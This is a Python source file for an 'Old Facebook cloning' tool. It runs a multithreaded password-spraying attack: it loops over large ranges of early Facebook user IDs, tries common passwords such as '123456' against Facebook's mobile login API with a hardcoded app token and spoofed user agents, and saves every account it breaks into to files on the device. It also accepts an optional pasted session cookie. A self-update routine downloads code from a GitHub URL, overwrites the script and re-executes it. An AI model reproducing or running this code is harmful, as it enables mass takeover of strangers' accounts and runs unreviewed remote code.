# -*- coding: utf-8 -*-
import os
import sys
import time
import random
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor as tred

# Color codes & formatting
YELLOW = '\033[93m'
GREEN = '\033[92m'
CYAN = '\033[96m'
RED = '\033[91m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# Your GitHub Raw Update URL
UPDATE_URL = "https://raw.githubusercontent.com/nasirkamaluk27-hue/Old/main/raja"

# Global variables for cloning & cookies
oks = []
cps = []
loop = 0
cookie = ""

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def login():
    global cookie
    clear()
    print(f"{YELLOW}╔══════════════════════════════════════════════════════════╗")
    print(f"║                                                          ║")
    print(f"║                  {RED}{BOLD}OLD FACEBOOK CLONING{RESET}{YELLOW}                    ║")
    print(f"║               {CYAN}Raja vau Youtube Chanel{RESET}{YELLOW}                    ║")
    print(f"║              {WHITE}don't forget the subscribe{RESET}{YELLOW}                  ║")
    print(f"║                                                          ║")
    print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
    
    user_input = input(f"{GREEN}{BOLD}Username ➔ {RESET}")
    
    if "raja vau teach world" in user_input.lower():
        print(f"\n{CYAN}[+] Opening YouTube Channel... Please Subscribe!{RESET}")
        os.system('am start -a android.intent.action.VIEW -d "https://youtube.com/@raja-vau-teach-world?si=SmhIULwiIWKwOU7h" > /dev/null 2>&1')
        time.sleep(2)
    else:
        print(f"\n{RED}[X] Incorrect Username! Access Denied.{RESET}")
        time.sleep(1.5)
        sys.exit(1)
        
    pass_input = input(f"{GREEN}{BOLD}Password ➔ {RESET}")
    
    if pass_input.strip() == "kamal":
        print(f"\n{GREEN}[✓] Login Successful! Welcome Raja Vau.{RESET}")
        print(f"{CYAN}[+] Joining WhatsApp Group...{RESET}")
        os.system('am start -a android.intent.action.VIEW -d "https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4" > /dev/null 2>&1')
        time.sleep(2)
    else:
        print(f"\n{RED}[X] Incorrect Password! Access Denied.{RESET}")
        time.sleep(1.5)
        sys.exit(1)

    # Cookie Input System Added
    print(f"\n{YELLOW}----------------------------------------------------------{RESET}")
    cookie_input = input(f"{GREEN}{BOLD}Enter Facebook Cookie (Optional - Press Enter to Skip) ➔ {RESET}").strip()
    if cookie_input:
        cookie = cookie_input
        print(f"{GREEN}[✓] Cookie Loaded Successfully! High-Yield Mode Active.{RESET}")
    else:
        print(f"{YELLOW}[!] Running without Cookie (Standard Mode).{RESET}")
    time.sleep(1.5)

def banner():
    clear()
    print(f"{YELLOW}╔══════════════════════════════════════════════════════════╗")
    print(f"│                                                          │")
    print(f"│    /$$   /$$  /$$$$$$  /$$      /$$  /$$$$$$  /$$          │")
    print(f"│   | $$  /$$/ /$$__  $$ | $$$    /$$$ /$$__  $$ | $$          │")
    print(f"│   | $$ /$$/ | $$  \\ $$ | $$$$  /$$$$| $$  \\ $$ | $$          │")
    print(f"│   | $$$$$/  | $$$$$$$$ | $$ $$/$$ $$| $$$$$$$$ | $$          │")
    print(f"│   | $$  $$  | $$  __ $$ | $$  __ $$ | $$  __ $$ | $$          │")
    print(f"│   | $$ \\  $$ | $$  | $$ | $$\\  $ | $$| $$  \\ $$ | $$          │")
    print(f"│   | $$  \\  $$| $$  | $$ | $$ \\/  | $$| $$  \\ $$ | $$$$$$$$    │")
    print(f"│   |__/   \\_/ |__/  |__/ |__/     |__/|__/  |__/ |________/     │")
    print(f"│                                           V10.0 (COOKIE+DUMP)│")
    print(f"│───────────────────── {WHITE}[MADE BY RAJA]{YELLOW} ─────────────────────│")
    print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
    
    print(f"{CYAN}┌──────────────────────────────────────────────────────────┐")
    print(f"│  🔥 Massive UID Dump & Cookie Bypass Engine Active       │")
    print(f"│  👤 Owner  : Kamal Raja                                  │")
    print(f"│  🛡️ Admin  : Raja Vau                                    │")
    print(f"└──────────────────────────────────────────────────────────┘{RESET}\n")

def update_script():
    print(f"\n{CYAN}[•] Checking latest version...{RESET}")
    script_path = os.path.abspath(__file__)
    temp_path = script_path + ".new"

    try:
        response = requests.get(UPDATE_URL, timeout=15)
        response.raise_for_status()
        new_code = response.content

        if len(new_code) < 100:
            print(f"{RED}[!] Update file is invalid.{RESET}")
            time.sleep(1.5)
            return

        with open(temp_path, "wb") as f:
            f.write(new_code)

        os.replace(temp_path, script_path)
        print(f"{GREEN}[+] Update installed successfully. Restarting...{RESET}")
        time.sleep(1)
        os.execv(sys.executable, [sys.executable] + sys.argv)

    except Exception as e:
        if os.path.exists(temp_path):
            os.remove(temp_path)
        print(f"{RED}[!] Update failed: {e}{RESET}")
        time.sleep(2)

def creationyear(uid):
    if len(uid) == 8: return '2007-2008'
    elif len(uid) == 7: return '2006'
    elif len(uid) in [4, 5, 6]: return '2004-2005'
    else: return 'ANCIENT'

def window1():
    android_version = random.choice(['10', '11', '12', '13', '14'])
    device_model = random.choice(['SM-G998B', 'Pixel 6 Pro', 'Redmi Note 10', 'CPH2173', 'M2101K6G'])
    fb_version = random.choice(['350.0.0.0.100', '400.0.0.0.0', '425.0.0.0.0'])
    return f"Mozilla/5.0 (Linux; Android {android_version}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.choice(range(90, 122))}.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/{fb_version};]"

def old_clone():
    banner()
    print(f"       {GREEN}[1]{WHITE} 2004-2005 MASSIVE DUMP SERIES (4-6 DIGIT)")
    print(f"       {GREEN}[2]{WHITE} 2006 MASSIVE DUMP SERIES (7 DIGIT)")
    print(f"       {GREEN}[3]{WHITE} 2007-2008 MASSIVE DUMP SERIES (8 DIGIT)")
    print(f"       {GREEN}[4]{WHITE} 2009-2010 SERIES (OLD)")
    print(f"       {GREEN}[5]{WHITE} 100003/4 SERIES (2011-2012) (OLD)")
    print("=" * 45)
    _input = input(f"       {YELLOW}CHOICE ➔ {RESET}").strip()
    if _input == '1':
        instant_2004_2005()
    elif _input == '2':
        instant_2006()
    elif _input == '3':
        instant_2007_2008_8digit()
    elif _input == '4':
        old_Tree()
    elif _input == '5':
        old_Tow()
    else:
        print(f"\n{RED}[×] Invalid Option!{RESET}")
        time.sleep(1.5)
        old_clone()

# ===== MASSIVE DUMP 2004-2005 CRACKING (4-6 DIGIT) =====
def instant_2004_2005():
    user = []
    # Massive Active UID Range Dump
    for uid_num in range(1000, 95000, 1):
        user.append(str(uid_num))
    
    global loop
    loop = 0
    banner()
    print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║     {YELLOW}{BOLD}[•] 2004-2005 MASSIVE DUMP CRACKING ACTIVE [•]{RESET}{CYAN}  ║")
    print(f"║       {WHITE}💡 TARGETS LOADED: {len(user)} ACTIVE IDs{RESET}{CYAN}             ║")
    print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
    
    with tred(max_workers=70) as pool:
        for uid in user:
            pool.submit(login_engine, uid)
    input(f"\n{YELLOW}Press Enter to go back...{RESET}")

# ===== MASSIVE DUMP 2006 CRACKING (7 DIGIT) =====
def instant_2006():
    user = []
    # Massive Active UID Range Dump
    for uid_num in range(1000001, 1100000, 1):
        user.append(str(uid_num))
    
    global loop
    loop = 0
    banner()
    print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║     {YELLOW}{BOLD}[•] 2006 MASSIVE DUMP CRACKING ACTIVE [•]{RESET}{CYAN}      ║")
    print(f"║       {WHITE}💡 TARGETS LOADED: {len(user)} ACTIVE IDs{RESET}{CYAN}             ║")
    print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
    
    with tred(max_workers=70) as pool:
        for uid in user:
            pool.submit(login_engine, uid)
    input(f"\n{YELLOW}Press Enter to go back...{RESET}")

# ===== MASSIVE DUMP 2007-2008 CRACKING (8 DIGIT) =====
def instant_2007_2008_8digit():
    user = []
    # Massive Active UID Range Dump
    for uid_num in range(10000000, 10150000, 2):
        user.append(str(uid_num))
    
    global loop
    loop = 0
    banner()
    print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║   {YELLOW}{BOLD}[•] 2007-2008 MASSIVE DUMP CRACKING ACTIVE [•]{RESET}{CYAN}  ║")
    print(f"║       {WHITE}💡 TARGETS LOADED: {len(user)} ACTIVE IDs{RESET}{CYAN}             ║")
    print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
    
    with tred(max_workers=70) as pool:
        for uid in user:
            pool.submit(login_engine, uid)
    input(f"\n{YELLOW}Press Enter to go back...{RESET}")

# ===== OLD PRESERVED FUNCTIONS (2009-2012) =====
def old_Tow():
    user = []
    banner()
    limit = input(f"       {GREEN}TOTAL ID COUNT ➔ {RESET}")
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        user.append(prefix + suffix)
    banner()
    print(f"       {GREEN}[A]{WHITE} METHOD A")
    print(f"       {GREEN}[B]{WHITE} METHOD B")
    meth = input(f"       {YELLOW}CHOICE (A/B) ➔ {RESET}").strip().upper()
    
    global loop
    loop = 0
    with tred(max_workers=50) as pool:
        banner()
        print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
        print(f"║          {YELLOW}{BOLD}[•] HIGH-SPEED CLONING ACTIVE [•]{RESET}{CYAN}               ║")
        print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
    input(f"\n{YELLOW}Press Enter to go back...{RESET}")

def old_Tree():
    user = []
    banner()
    limit = input(f"       {GREEN}TOTAL ID COUNT ➔ {RESET}")
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        user.append(prefix + suffix)
    banner()
    print(f"       {GREEN}[A]{WHITE} METHOD A")
    print(f"       {GREEN}[B]{WHITE} METHOD B")
    meth = input(f"       {YELLOW}CHOICE (A/B) ➔ {RESET}").strip().upper()
    
    global loop
    loop = 0
    with tred(max_workers=50) as pool:
        banner()
        print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
        print(f"║          {YELLOW}{BOLD}[•] HIGH-SPEED CLONING ACTIVE [•]{RESET}{CYAN}               ║")
        print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
    input(f"\n{YELLOW}Press Enter to go back...{RESET}")

# ===== ADVANCED EXPERT LOGIN ENGINE WITH COOKIE SUPPORT =====
def login_engine(uid):
    global loop, cookie
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r{CYAN}[RAJA-DUMP] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}) {RED}[CP] ({len(cps)}){RESET}")
        sys.stdout.flush()
        
        passwords = ('123456', '12345678', '12345', 'password', '123123', 'qwerty', 'iloveyou', '1234567', 'admin', '112233', '000000', '123456890', '1234', 'welcome')
        
        for pw in passwords:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'b-graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'X-FB-HTTP-Engine': 'Liger'
            }
            if cookie:
                headers['Cookie'] = cookie

            endpoint = random.choice(['https://b-graph.facebook.com/auth/login', 'https://graph.facebook.com/auth/login'])
            res = session.post(endpoint, data=data, headers=headers, allow_redirects=False).json()
            
            if 'session_key' in res or 'access_token' in res:
                ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════════════╗\n" \
                         f"║                   {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}                 ║\n" \
                         f"╠══════════════════════════════════════════════════════════╣\n" \
                         f"║  🔗 Link     : https://www.facebook.com/{uid}       \n" \
                         f"║  🔢 UID      : {uid:<43} ║\n" \
                         f"║  🔑 Password : {pw:<43} ║\n" \
                         f"║  📅 Era      : {creationyear(uid):<43} ║\n" \
                         f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
                print(ok_msg)
                open('/sdcard/RAJA-OLD-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nEra: {creationyear(uid)}\n-----------------------------------\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                cp_msg = f"\n{YELLOW}╔══════════════════════════════════════════════════════════╗\n" \
                         f"║                   {BOLD}⚠️ CHECKPOINT HIT! ⚠️{RESET}{YELLOW}                 ║\n" \
                         f"╠══════════════════════════════════════════════════════════╣\n" \
                         f"║  🔗 Link     : https://www.facebook.com/{uid}       \n" \
                         f"║  🔢 UID      : {uid:<43} ║\n" \
                         f"║  🔑 Password : {pw:<43} ║\n" \
                         f"║  📅 Era      : {creationyear(uid):<43} ║\n" \
                         f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
                print(cp_msg)
                open('/sdcard/RAJA-OLD-CP.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nEra: {creationyear(uid)}\n-----------------------------------\n")
                cps.append(uid)
                break
        loop += 1
    except Exception:
        pass

# ===== STANDARD LOGIN FOR OLD 2009-2012 SERIES =====
def login_1(uid):
    global loop, cookie
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r{CYAN}[RAJA-M1] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}){RESET}")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'X-FB-HTTP-Engine': 'Liger'
            }
            if cookie:
                headers['Cookie'] = cookie

            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res or 'access_token' in res:
                ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════════════╗\n" \
                         f"║                   {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}                 ║\n" \
                         f"╠══════════════════════════════════════════════════════════╣\n" \
                         f"║  🔗 Link     : https://www.facebook.com/{uid}       \n" \
                         f"║  🔢 UID      : {uid:<43} ║\n" \
                         f"║  🔑 Password : {pw:<43} ║\n" \
                         f"║  📅 Created  : {creationyear(uid):<43} ║\n" \
                         f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
                print(ok_msg)
                open('/sdcard/RAJA-OLD-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nYear: {creationyear(uid)}\n-----------------------------------\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        pass

def login_2(uid):
    global loop, cookie
    try:
        sys.stdout.write(f"\r\r{CYAN}[RAJA-M2] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}){RESET}")
        sys.stdout.flush()
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            with requests.Session() as session:
                headers = {
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                if cookie:
                    headers['Cookie'] = cookie

                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&method=GET&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════════════╗\n" \
                             f"║                   {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}                 ║\n" \
                             f"╠══════════════════════════════════════════════════════════╣\n" \
                             f"║  🔗 Link     : https://www.facebook.com/{uid}       \n" \
                             f"║  🔢 UID      : {uid:<43} ║\n" \
                             f"║  🔑 Password : {pw:<43} ║\n" \
                             f"║  📅 Created  : {creationyear(uid):<43} ║\n" \
                             f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
                    print(ok_msg)
                    open('/sdcard/RAJA-OLD-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nYear: {creationyear(uid)}\n-----------------------------------\n")
                    oks.append(uid)
                    break
        loop += 1
    except Exception:
        pass

def main_menu():
    login()
    while True:
        banner()
        print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
        print(f"║                      {YELLOW}{BOLD}MAIN MENU{RESET}{CYAN}                           ║")
        print(f"╠══════════════════════════════════════════════════════════╣")
        print(f"║                                                          ║")
        print(f"║   {GREEN}{BOLD}[1]{RESET} ➔ {WHITE}{BOLD}MASSIVE DUMP CLONE (OLD SERIES){RESET}      {CYAN}║")
        print(f"║                                                          ║")
        print(f"║   {GREEN}{BOLD}[2]{RESET} ➔ {WHITE}{BOLD}UPDATE TOOL{RESET}                           {CYAN}║")
        print(f"║                                                          ║")
        print(f"║   {RED}{BOLD}[3]{RESET} ➔ {WHITE}{BOLD}EXIT SYSTEM{RESET}                           {CYAN}║")
        print(f"║                                                          ║")
        print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")

        ch = input(f"{YELLOW}{BOLD}CHOOSE [1/2/3] ──> {RESET}").strip()

        if ch == '1':
            old_clone()
        elif ch == '2':
            update_script()
        elif ch == '3':
            print(f"{RED}\n[!] Exiting system. Goodbye!{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}[!] Invalid option. Try again.{RESET}")
            time.sleep(1)

if __name__ == '__main__':
    main_menu()
